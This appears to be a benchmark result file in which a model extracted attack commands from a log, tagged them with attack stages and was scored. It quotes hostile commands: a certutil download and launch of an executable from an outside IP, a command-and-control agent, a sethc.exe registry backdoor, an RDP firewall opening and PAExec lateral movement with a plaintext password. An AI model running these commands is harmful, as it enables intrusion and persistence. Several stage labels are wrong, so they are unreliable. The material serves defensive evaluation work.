@@ -1,0 +1,95 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Reg ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "NetSh AdvFireWall Firewall Add Rule Name=* RemoteDesktop Dir=In Action=Allow Protocol=TCP LocalPort=3389",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "del /f /q nbtscan.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "PAExec.exe \\192.168.0.95 -u administrator -p Data123456!",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attackers started their operation via Initial Access through a malicious link downloaded as 'sangforcat.exe'. The malware downloaded additional tools such as 'Phpstudy', 'Winbrute', and others. Once inside, they attempted to elevate privileges through various means like modifying registry keys and creating new users. They also utilized PowerShell scripts to expand access and avoid detection. Furthermore, they executed lateral movement operations using PAExec and manipulated network settings to create backdoors.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 10717,
+      "completion_tokens": 531,
+      "total_tokens": 11248,
+      "wall_clock_s": 7.279,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.36363636363636365,
+      "recall": 0.5714285714285714,
+      "f1": 0.4444444444444444,
+      "tp": 4,
+      "fp": 7,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.18181818181818182,
+      "recall": 0.3333333333333333,
+      "f1": 0.23529411764705885,
+      "tp": 2,
+      "fp": 9,
+      "fn": 4,
+      "recall_partial": 0.4166666666666667
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 10717,
+      "completion_tokens": 531,
+      "total_tokens": 11248,
+      "wall_clock_s": 7.279,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
